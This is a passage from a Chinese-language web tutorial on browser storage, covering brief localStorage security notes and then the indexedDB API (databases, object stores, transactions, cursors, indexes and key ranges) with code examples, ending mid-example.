class="copyButton_1Zmi">Copy</button></div></pre><p>空间大小：建议5M，防止三级域名共享数据。</p><p>安全性</p><ul><li>dns欺骗攻击，不能保证是该域的主机，网页最好使用TLS，TLS可以确保只有用户、代表用户的软件及其他使用TLS的页面（同一个域的证书）可以访问器存储区域。</li><li>跨目录攻击，比如多人共享目录，xxx.com/a， xxx.com/b，应避免使用storage</li><li>浏览器必须要实现同源策略</li><li>小心第三方脚本的读取也写入</li></ul><h1><a aria-hidden="true" class="anchor" id="indexeddb"></a><a aria-hidden="true" class="hash-link" href="#indexeddb">#</a>indexedDB</h1><blockquote><p>学完后需要将张鑫旭的实例自己实战一番。否则会很懵逼。</p></blockquote><p>浏览器处理能力不断增强，越来越多的网站考虑将大量数据存在客户端。但是 cookie 和 localStorage 都不适合储存大量数据。</p><p><strong>1. indexeddb的特点？</strong></p><ul><li>键值对存储，值可以是js对象;键是独一无二的，重复则报错。</li><li>异步读写，而localStorage是同步的。</li><li>支持事务：只要有一步失败，则整个事务取消。不存在只改写一部分数据的情况。</li><li>同域限制</li><li>存储空间大：一般不小于250m，chrome和opera是剩余空间的某个百分比，firefox没有上限。</li><li>支持二进制存储</li></ul><p><strong>2. 几个概念</strong></p><p><strong>2. indexedDB简介？</strong></p><p>indexedDB是一个全局对象，它是IDBFactory的实例。</p><p><img src="./img/indexDB.png"/></p><p>可以看到，它有三个方法：cmp、deleteDatabase、open。</p><p>cmp用于比较两个键的大小，-1表示小于，0表示相等，1表示大于。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">indexedDB</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">cmp</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;a&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;b&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// -1</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">indexedDB</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">cmp</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;a&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;a&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 0</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">indexedDB</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">cmp</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;ade&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;abc&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 1</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>open、deleteDatabase分别表示请求连接数据库和请求删除数据库。注意只是请求，和ajax的send方法一样，都是异步的。</p><p><strong>3. 创建数据库</strong></p><p>创建数据库使用open方法。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">var openRequest = indexedDB.open(&#x27;test&#x27;, 1)</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>open方法有2个参数：第一个参数是数据库名称，第二个参数是数据库的版本号，如果不传，默认是1。如果数据库不存在，则会新建数据库。</p><p>open方法返回一个IDBOpenDBRequest对象。</p><p><img src="./_img/idb-open-db-request.png" alt="idb-open-db-request"/></p><p>上图可以看到，openRequest 有四个事件函数，分别是：</p><ul><li>onblocked：表示连接时，如果上次数据库连接还未关闭时触发</li><li>onerror：打开数据库失败时触发</li><li>onsuccess：打开数据库成功时触发</li><li>onupgradeneeded：新建数据库或数据库版本升级时触发</li></ul><p>下面是一个稍微完整的连接数据库的例子。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token keyword" style="color:rgb(127, 219, 202)">var</span><span class="token plain"> openRequest </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> indexedDB</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">open</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;test&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method-variable function-variable method function property-access" style="color:rgb(130, 170, 255)">onsucess</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">function</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token parameter">e</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token console class-name" style="color:rgb(255, 203, 139)">console</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">log</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;onsucess&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token console class-name" style="color:rgb(255, 203, 139)">console</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">log</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;连接的数据库对象是db:&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> e</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">target</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">result</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method-variable function-variable method function property-access" style="color:rgb(130, 170, 255)">onerror</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">function</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token console class-name" style="color:rgb(255, 203, 139)">console</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">log</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;onerror&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method-variable function-variable method function property-access" style="color:rgb(130, 170, 255)">onupgradeneeded</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">function</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token console class-name" style="color:rgb(255, 203, 139)">console</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">log</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;onupgradeneeded&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>上面的代码中，可以通过 e.target.result获取连接的数据库对象。</p><p><strong>4. 新建对象仓库</strong></p><p>在关系型数据库里，数据库建好后，就需要建表了。但是indexedDB里不叫表，叫&quot;对象仓库&quot;，其实它类似于表。</p><p>通过db.createObjectStore()可以创建对象仓库，如果对象仓库已经存在，会抛出一个错误。为了避免错误需要用db.objectStoreNames的contains方法来检测仓库是否存在。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token keyword" style="color:rgb(127, 219, 202)">var</span><span class="token plain"> openRequest </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> indexedDB</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">open</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;test&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method-variable function-variable method function property-access" style="color:rgb(130, 170, 255)">onupgradeneeded</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">function</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token parameter">e</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">var</span><span class="token plain"> db </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">target</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">result</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token keyword" style="color:rgb(127, 219, 202)">if</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token operator" style="color:rgb(127, 219, 202)">!</span><span class="token plain">db</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">objectStoreNames</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">contains</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;firstOS&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        db</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">createObjectStore</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;firstOS&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain">autoIncrement</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token boolean" style="color:rgb(255, 88, 116)">true</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><blockquote><p>只能在onupgradeneeded事件里使用createObjectStore。如果在onsucess里使用createObjectStore，会报错<code>Failed to execute &#x27;createObjectStore&#x27; on &#x27;IDBDatabase&#x27;: The database is not running a version change transaction</code>。</p></blockquote><p>上面的代码，在onupgradeneeded事件里创建了一个名叫firstOS的对象仓库。onupgradeneeded事件是在新建数据库或数据库版本改变时触发，所以如果数据库存在，新建对象仓库时，必须增加版本号。</p><p>db.objectStoreNames返回一个DOMStringList对象，包含数据库所有对象仓库的名称。它的contains方法，可以检查数据库是否包含某个“对象仓库”。</p><p>db.createObjectStore()方法接受有2个参数，第一个是对象仓库的名称，第二个是键名的特征，keyPath指定用那个字段做键名，默认是null;autoIncrement表示以自动递增的整数做键名，默认是false。一般来说，keyPath和autoIncrement属性只要使用一个就够了，如果两个同时使用，表示键名为递增的整数，且对象不得缺少指定属性。</p><ol start="5"><li>操作数据</li></ol><p>操作数据分为读、写、修改、删除数据。要操作数据，必须首先使用transaction()方法创建数据库事务。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">var t = db.transaction([&quot;firstOS&quot;], &quot;readwrite&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = t.objectStore(&quot;firstOS&quot;);</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>transaction()方法第一个参数是涉及的对象仓库数组，通常只有一个。第二个参数是表示操作类型的字符串，目前只支持readonly(读时用)和readwrite(写时用)两种。</p><p>transaction()也是异步的，。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">abort：事务中断。</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">complete：事务完成。</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">error：事务出错。</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>要注意的是，在onupgradeneeded里面可以直接获取transaction，不能新建，否则报错。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest.onupgradeneeded = function (e) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var db = e.target.result</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    if (!db.objectStoreNames.contains(&quot;firstOS&quot;)) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        db.createObjectStore(&quot;firstOS&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    // 错误：会抛出下面的错误</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    // var transaction = db.transaction([&#x27;firstOS&#x27;], &#x27;readwrite&#x27;)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    // 正确</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var transaction = e.target.transaction</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p><img src="./_img/transaction-error.png" alt="transaction-error"/></p><p>所以为了让代码清晰点，通常是在onupgradeneeded里创建对象仓库，在onsuccess里操作数据。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest.onupgradeneeded = function (e) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var db = e.target.result</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    if (!db.objectStoreNames.contains(&quot;firstOS&quot;)) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        db.createObjectStore(&quot;firstOS&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">openRequest.onsuccess = function (e) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    console.log(&#x27;Success&#x27;, e.target)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var transaction = e.target.result.transaction([&#x27;firstOS&#x27;], &#x27;readwrite&#x27;)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var store = transaction.objectStore(&#x27;firstOS&#x27;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    store.add({p: 123}, 1)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">         .onsuccess(function(){</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">            console.log(&#x27;添加数据成功&#x27;)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">         })</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>通过store对象可以操作数据，下面看store的几个方法：</p><ul><li>add(obj, key)：添加数据，key表示键名，如果创建数据仓库时设置了键，则可以不指定</li><li>get(key)：通过key获取数据</li><li>delete(key)：通过key删除数据</li><li>openCursor()：创建一个指针，用于遍历数据仓库。<ul><li>第一个参数是一个Range对象，表示遍历的范围，需要通过IDBKeyRange创建，后面有介绍。</li><li>第二个参数，表示遍历方向，默认值为next，其他可能的值为prev、nextunique和prevunique。后两个值表示如果遇到重复值，会自动跳过。</li></ul></li></ul><p>注意它们都是异步的，有onsuccess和onerror事件，下面是用法的实例：</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">// 添加数据：add()</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = t.objectStore(&quot;firstOS&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var o = {p: 123};</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var request = store.add(o,1);  // 1表示键名，如果创建数据仓库时，设置了键，则可以不指定</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">request.onerror = function(){}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">request.onsuccess = function(){}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 获取数据：get()</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var t = db.transaction([&quot;firstOS&quot;], &quot;readonly&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = t.objectStore(&quot;firstOS&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var ob = store.get(1);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">ob.onsuccess = function(e){</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    console.log(e.target.result) // {p: 123}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 更新数据</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var o = { p:456 };</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var request = store.put(o, 1);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 删除数据</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var t = db.transaction([&quot;people&quot;], &quot;readwrite&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var request = t.objectStore(&quot;people&quot;).delete(1);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 遍历数据</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var t = db.transaction([&quot;test&quot;], &quot;readonly&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = t.objectStore(&quot;test&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var cursor = store.openCursor();  // 创建一个指针</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">cursor.onsuccess = function(e) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var res = e.target.result;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    if(res) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        console.log(&quot;Key&quot;, res.key);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        console.dir(&quot;Data&quot;, res.value);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        res.continue(); // 指针向后移动，如果已经是最后一个，则光标执行null</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 链式写法</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">db.transaction([&quot;test&quot;], &quot;readonly&quot;)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  .objectStore(&quot;test&quot;)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  .get(X)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  .onsuccess = function(e){}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>创建索引和读取数据</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = db.createObjectStore(&quot;people&quot;, { autoIncrement:true });</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">store.createIndex(&quot;name&quot;,&quot;name&quot;, {unique:false});</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">store.createIndex(&quot;email&quot;,&quot;email&quot;, {unique:true});</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var t = db.transaction([&quot;people&quot;],&quot;readonly&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = t.objectStore(&quot;people&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var index = store.index(&quot;name&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var request = index.get(name);</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><ol start="6"><li>关于索引</li></ol><p>索引的作用：</p><ul><li>索引就像表的字段，用于数据的操作</li><li>指定读取数据的范围，可以通过IDBKeyRange对象创建Range对象。</li></ul><p>下面是一个使用索引的例子：</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">var index = objectStore.index(&quot;name&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">index.get(&quot;Donna&quot;).onsuccess = function(event) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  alert(&quot;Donna&#x27;s SSN is &quot; + event.target.result.ssn);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">};</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>Donna可能不止一个，它总是会获取键值最小的那个。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">index.openCursor().onsuccess = function(event) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  var cursor = event.target.result;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  if (cursor) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    // cursor.key 是一个 name, 就像 &quot;Bill&quot;, 然后 cursor.value 是整个对象。</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    alert(&quot;Name: &quot; + cursor.key + &quot;, SSN: &quot; + cursor.value.ssn + &quot;, email: &quot; + cursor.value.email);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    cursor.continue();</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">};</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">index.openKeyCursor().onsuccess = function(event) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  var cursor = event.target.result;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  if (cursor) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    // cursor.key 是一个 name, 就像 &quot;Bill&quot;, 然后 cursor.value 是那个 SSN。</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    // 没有办法可以得到存储对象的其余部分。</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    alert(&quot;Name: &quot; + cursor.key + &quot;, SSN: &quot; + cursor.value);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    cursor.continue();</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">  }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">};</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>IDBKeyRange对象的作用是生成一个表示范围的Range对象。</p><p><img src="./_img/IDBKeyRange.png" alt="IDBKeyRange"/></p><p>它有四个方法可以生成Range，分别是:</p><ul><li>lowerBound()：指定范围的下限</li><li>upperBound()：指定范围的上限</li><li>bound():指定范围的上下限</li><li>only：指定范围只有一个值</li></ul><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">// 小于3，第二个参数true表示不包含等于，默认是false，表示&lt;=3</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// IDBKeyRange{lower: undefined, lowerOpen: true, upper : 3, upperOpen: true }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var r1 = IDBKeyRange.upperBound(3, true)</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var r6 = IDBKeyRange.bound(x, y, true, true);</span></div><div 